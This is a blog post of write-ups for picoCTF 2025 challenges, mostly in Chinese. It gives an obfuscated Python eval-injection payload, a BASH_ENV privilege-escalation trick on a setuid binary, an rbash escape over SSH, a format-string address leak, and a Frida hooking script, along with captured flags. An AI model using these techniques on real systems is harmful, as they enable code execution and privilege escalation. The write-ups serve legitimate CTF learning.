---
title: "picoCTF 2025 write-ups"
published: 2025-03-11T00:00:00.000Z
description: ""
tags: []
category: "general"
draft: false
---
# picoCTF 2025 write-ups

## Web
### 3v@l
payload: getattr(__import__('o'+'s'), 'po'+'pen')('tac${IFS}'+chr(47)+'fl*').read()

### SSTI2
payload: 


### WebSockFish

在console裡面控制遊戲
```
game.load("8/8/8/8/8/8/8/R7 w - - 0 1");
true
board.position(game.fen());
undefined
makeBestMove();
undefined
ws.send("mate 0");
undefined
3verbal-sleep.picoctf.net/:1 Uncaught (in promise) Error: A listener indicated an asynchronous response by returning true, but the message channel closed before a response was received
sendMessage("mate -1")  // 表示AI被將軍，1步內輸掉

undefined
sendMessage("eval -9999")  // 表示AI處於極其不利的局面

undefined
sendMessage("mate -1")  // 

undefined
sendMessage("eval 12")  // 

undefined
sendMessage("eval -10")  // 

undefined
sendMessage("eval -999999999999999")  // 這樣才是win in a convincing manner

undefined
```

### Apriti sesamo
emacs 代表可以在網址後加一個 ~
會發現網頁原始碼有隱藏的判斷邏輯程式碼
發現其實就是SHA1 collision

![image](/images/apriti_sesamo_image1.png)




### Hash-only 1
```
ctf-player@pico-chall$ echo 'cat /root/flag.txt' > /tmp/exploit.sh
ctf-player@pico-chall$ export BASH_ENV=/tmp/exploit.sh
ctf-player@pico-chall$ ./flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_ae1d8678}4d4f660d53535446f15c1a3a7b535e50  /root/flag.txt
```

<!--more-->


### Hash-only 2
```
ctf-player@pico-chall$ ln -s /challenge/flaghasher flaghasher
ctf-player@pico-chall$ ls
flaghasher
ctf-player@pico-chall$ ./flaghasher
-rbash: ./flaghasher: restricted: cannot specify `/' in command names
ctf-player@pico-chall$ export PATH=$PATH:/challenge
-rbash: PATH: readonly variable
ctf-player@pico-chall$ flaghasher
Computing the MD5 hash of /root/flag.txt....

d77111adc0e4a3034d6e0dac135d32a8  /root/flag.txt
ctf-player@pico-chall$ echo $SHELL
/bin/rbash
ctf-player@pico-chall$ bash -c '/challenge/flaghasher'
bash: /challenge/flaghasher: Permission denied
ctf-player@pico-chall$ logout
Connection to rescued-float.picoctf.net closed.
moneychan@qianxinyideMacBook-Pro-3 ~ % ssh ctf-player@rescued-float.picoctf.net -p 55919 "/challenge/flaghasher"
ctf-player@rescued-float.picoctf.net's password:
rbash: /challenge/flaghasher: restricted: cannot specify `/' in command names
moneychan@qianxinyideMacBook-Pro-3 ~ % ssh ctf-player@rescued-float.picoctf.net -p 55919
ctf-player@rescued-float.picoctf.net's password:
Permission denied, please try again.
ctf-player@rescued-float.picoctf.net's password:
Permission denied, please try again.
ctf-player@rescued-float.picoctf.net's password:

moneychan@qianxinyideMacBook-Pro-3 ~ % ssh ctf-player@rescued-float.picoctf.net -p 55919 -t "bash --noprofile"

ctf-player@rescued-float.picoctf.net's password:
ctf-player@challenge:~$ /challenge/flaghasher
bash: /challenge/flaghasher: Permission denied
ctf-player@challenge:~$ pwd
/home/ctf-player
ctf-player@challenge:~$ ls
flaghasher
ctf-player@challenge:~$ flaghasher
Computing the MD5 hash of /root/flag.txt....

d77111adc0e4a3034d6e0dac135d32a8  /root/flag.txt
ctf-player@challenge:~$ cd ..
ctf-player@challenge:/home$ ls
ctf-player
ctf-player@challenge:/home$ cd ctf-player/
ctf-player@challenge:~$ echo 'cat /root/flag.txt' > /tmp/exploit.sh
ctf-player@challenge:~$ export BASH_ENV=/tmp/exploit.sh
ctf-player@challenge:~$ ./flaghasher
bash: ./flaghasher: Permission denied
ctf-player@challenge:~$ flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_9c5db6a7}d77111adc0e4a3034d6e0dac135d32a8  /root/flag.txt
```



### PIETIME 2
```
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025picoCTF/pietime2]
└─$ gdb ./vuln
GNU gdb (Debian 15.2-1+b1) 15.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "aarch64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./vuln...
(No debugging symbols found in ./vuln)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x00000000000011c0  _start
0x00000000000011f0  deregister_tm_clones
0x0000000000001220  register_tm_clones
0x0000000000001260  __do_global_dtors_aux
0x00000000000012a0  frame_dummy
0x00000000000012a9  segfault_handler
0x00000000000012c7  call_functions
0x000000000000136a  win
0x0000000000001400  main
0x0000000000001450  __libc_csu_init
0x00000000000014c0  __libc_csu_fini
0x00000000000014c8  _fini
```

```
moneychan@qianxinyideMacBook-Pro-3 ~ % nc rescued-float.picoctf.net 63223
Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x5acf170de2a1 (nil) 0x5acf170de2d0 0x7fffca9bdda0 0x7c 0x7fffca9f2228 0x7468b317e6a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252070252070 0x5aceec751400 0x7fffca9bde00 0x5aceec7511c0
 enter the address to jump to, ex => 0x12345: 0x5aceec75136a
You won!
picoCTF{p13_5h0u1dn'7_134k_bb903549}
```


### TapIntoHash
從題目的描述和提供的源代碼來看，這題涉及了一個區塊鏈的範例程式，其中使用了 `sha256` 哈希和加密的部分。你需要進行兩個主要操作：反向工程這段代碼以提取出加密的旗標內容，並解密它。

讓我們從以下幾個關鍵部分入手：

### 1. 分析 `block_chain.py` 代碼

- `encrypt` 函數: 這個函數會將一個字串進行加密，這裡用了 XOR 與 SHA256 哈希來加密。主要步驟是：
  1. 將傳入的 `plaintext` 分割成兩部分，並將中間插入 `inner_txt`。
  2. 接著會對這個新的字串進行填充(padding)。
  3. 然後進行塊加密，將每一個 16 字節的塊進行 XOR 操作，密鑰是基於 `key` 進行 SHA256 哈希運算得到的。

- `decode_transactions` 函數: 這是用來解碼交易資料的，使用了 base64 解碼。

- `main` 函數:
  1. 會生成一個隨機的密鑰。
  2. 然後創建區塊鏈並執行工作量證明 (proof of work)，生成多個區塊。
  3. 用這個加密過的區塊鏈字串來加密一個由參數 `token` 生成的字符串。

### 2. 加密流程

`encrypt` 函數的運行原理：

1. **拼接字串：**
   - 將 `plaintext` 分割成兩部分，然後將 `inner_txt` 插入中間。
2. **填充（Padding）：**
   - 使用 `pad` 函數將字串填充為 16 字節的倍數。
3. **加密：**
   - 將填充後的字串進行分塊（每塊 16 字節），並與密鑰進行 XOR 操作，得到加密的結果。

### 3. 解密過程

由於加密使用了 XOR，因此解密過程實際上是相同的操作，直接用相同的密鑰對加密的字串進行 XOR 操作即可得到原始內容。

### 4. 應該如何進行反向工程

1. **解密 `Encrypted Blockchain`:** 你已經得到了加密過的區塊鏈字串 (`Encrypted Blockchain`) 和密鑰。你需要對 `Encrypted Blockchain` 進行 XOR 解密。

2. **查找 `token` 的作用：** `token` 作為參數傳入 `main` 函數，並插入到了加密過程中。這個 `token` 很可能是與加密相關的一部分，你需要知道它的具體內容。

3. **解碼 `Encrypted Blockchain` 字串：** 由於區塊鏈字串被加密，你需要使用 `encrypt` 函數的相反過程來解密它。

### 解密的代碼邏輯

以下是一個可能的解密邏輯，你可以將 `Encrypted Blockchain` 和密鑰進行 XOR 解密。

```python
import hashlib

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def decrypt(ciphertext, key):
    block_size = 16
    key_hash = hashlib.sha256(key).digest()
    plaintext = b''

    # 逐塊解密
    for i in range(0, len(ciphertext), block_size):
        block = ciphertext[i:i + block_size]
        decrypted_block = xor_bytes(block, key_hash)
        plaintext += decrypted_block

    return plaintext.decode('utf-8')

# 加載加密內容和密鑰
encrypted_blockchain = b'...'  # 這裡放入提供的 Encrypted Blockchain
key = b'B\xfdL\x92\xf1C\x8fP\xb4\xd4dt\x8b\x18\xcfR\xfd`\xd1-\xa5\xde\xcd\x89\xee\xdb\xfb\r\x83&\x07\x82'

# 解密
decrypted_content = decrypt(encrypted_blockchain, key)
print(decrypted_content)
```

這段代碼會將加密的區塊鏈內容與提供的密鑰進行解密，並輸出解密後的字串。

### 5. 結論

進行解密後，應該能夠恢復出原始的區塊鏈內容，並從中提取出旗標。





### Binary Instrumentation 2

hook_createfile.js:
```
// 創建一個真實的文件以獲取有效句柄  <-------當初這裡我卡超久
var fileName = "flag.txt";
var realFile = new File(fileName, "w");

Interceptor.attach(Module.getExportByName(null, 'CreateFileA'), {
  onEnter: function (args) {
    this.origPath = Memory.readUtf8String(args[0]);
    console.log("CreateFileA called with: " + this.origPath);
    
    // 替換為我們的文件名
    args[0] = Memory.allocUtf8String(fileName);
    
    // 保存其他參數以便調試
    this.dwDesiredAccess = args[1];
    this.dwShareMode = args[2];
    this.lpSecurityAttributes = args[3];
    this.dwCreationDisposition = args[4];
    this.dwFlagsAndAttributes = args[5];
    this.hTemplateFile = args[6];
    
    console.log("Access: " + this.dwDesiredAccess);
    console.log("Share Mode: " + this.dwShareMode);
    console.log("Creation: " + this.dwCreationDisposition);
  },
  onLeave: function (retval) {
    console.log("CreateFileA would return: " + retval);
    
    // 如果返回無效句柄，替換為我們的有效句柄
    if (retval.compare(ptr("-1")) === 0) {
      console.log("Replacing invalid handle with valid one");
      retval.replace(realFile.handle);
    }
  }
});

// 攔截WriteFile以捕獲寫入的數據
Interceptor.attach(Module.getExportByName(null, 'WriteFile'), {
    onEnter: function (args) {
      console.log("WriteFile called with buffer at: " + args[1]);
      
      // 檢查原始緩衝區周圍的內存
      var originalBuffer = args[1];
      console.log("Examining memory around buffer:");
      
      // 向前搜索100字節
      var forwardData = Memory.readByteArray(originalBuffer, 100);
      console.log("Forward 100 bytes:\n" + hexdump(forwardData));
      
      // 向後搜索100字節
      try {
        var backwardData = Memory.readByteArray(originalBuffer.sub(100), 100);
        console.log("Backward 100 bytes:\n" + hexdump(backwardData));
      } catch (e) {
        console.log("Error reading backward: " + e);
      }
      
      // 嘗試在緩衝區周圍搜索"picoCTF"字符串
      Process.enumerateRanges('rw-').forEach(function(range) {
        if (range.base.compare(originalBuffer.sub(1024)) <= 0 && 
            range.base.add(range.size).compare(originalBuffer.add(1024)) >= 0) {
          console.log("Searching for flag in range: " + range.base + " - " + range.size);
          try {
            Memory.scan(range.base, range.size, 'picoCTF', {
              onMatch: function(address, size) {
                console.log("Found flag pattern at: " + address);
                // 讀取可能的flag（假設最大長度為100字節）
                try {
                  var flag = Memory.readCString(address);
                  console.log("FLAG FOUND: " + flag);
                } catch (e) {
                  console.log("Error reading flag: " + e);
                  // 嘗試讀取固定長度
                  var data = Memory.readByteArray(address, 50);
                  console.log("Raw data:\n" + hexdump(data));
                }
              }
            });
          } catch (e) {
            // 忽略錯誤
          }
        }
      });
      
      // 修改WriteFile參數，強制寫入一些數據
      // 注意：這可能會導致程序崩潰，但我們已經捕獲了可能的flag
      if (args[2].toInt32() === 0) {
        console.log("Attempting to force write with non-zero length");
        // 嘗試寫入100字節
        args[2] = ptr(100);
      }
    }
  });

// 攔截CloseHandle以確保我們的文件被正確關閉
Interceptor.attach(Module.getExportByName(null, 'CloseHandle'), {
  onEnter: function (args) {
    console.log("CloseHandle called on: " + args[0]);
  }
});

// 攔截ExitProcess以延遲程序終止
Interceptor.attach(Module.getExportByName(null, 'ExitProcess'), {
  onEnter: function (args) {
    console.log("ExitProcess called with code: " + args[0]);
    
    // 確保我們的文件被關閉
    try {
      realFile.close();
    } catch (e) {
      // 忽略錯誤
    }
    
    // 檢查是否有任何數據寫入到我們的文件
    try {
      var content = File.readAllText(fileName);
      console.log("Content written to file: " + content);
      
      if (content.includes("picoCTF")) {
        console.log("FLAG FOUND IN FILE: " + content);
      }
    } catch (e) {
      console.log("Error reading file: " + e);
    }
    
    // 延遲退出
    console.log("Sleeping before exit...");
    Thread.sleep(2);
  }
});
```



```
PS D:\CyberSecurity\picoCTF2025> frida -f .\bininst2.exe -l .\hook_createfile.js
     ____
    / _  |   Frida 16.6.6 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Local System (id=local)
Spawned `.\bininst2.exe`. Resuming main thread!
[Local::bininst2.exe ]-> CreateFileA called with: <Insert path here>
Access: 0x40000000
Share Mode: 0x0
Creation: 0x2
CreateFileA would return: 0x2c8
WriteFile called with buffer at: 0x140002270
Examining memory around buffer:
Forward 100 bytes:
           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
00000000  63 47 6c 6a 62 30 4e 55 52 6e 74 6d 63 6a 46 6b  cGljb0NURntmcjFk
00000010  59 56 39 6d 4d 48 4a 66 59 6a 46 75 58 32 6c 75  YV9mMHJfYjFuX2lu
00000020  4e 58 52 79 64 57 30 7a 62 6e 51 30 64 47 6c 76  NXRydW0zbnQ0dGlv
00000030  62 69 46 66 59 6a 49 78 59 57 56 6d 4d 7a 6c 39  biFfYjIxYWVmMzl9
00000040  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00000050  40 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00  @...............
00000060  00 00 00 00                                      ....
Backward 100 bytes:
           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00000020  00 00 00 00 80 30 00 40 01 00 00 00 20 31 00 40  .....0.@.... 1.@
00000030  01 00 00 00 ff ff ff ff ff ff ff ff ff ff ff ff  ................
00000040  ff ff ff ff 3c 49 6e 73 65 72 74 20 70 61 74 68  ....<Insert path
00000050  20 68 65 72 65 3e 00 00 00 00 00 00 00 00 00 00   here>..........
00000060  00 00 00 00                                      ....
Attempting to force write with non-zero length
ExitProcess called with code: 0x0
Content written to file:
Sleeping before exit...
Process terminated
[Local::bininst2.exe ]->

Thank you for using Frida!
PS D:\CyberSecurity\picoCTF2025>
```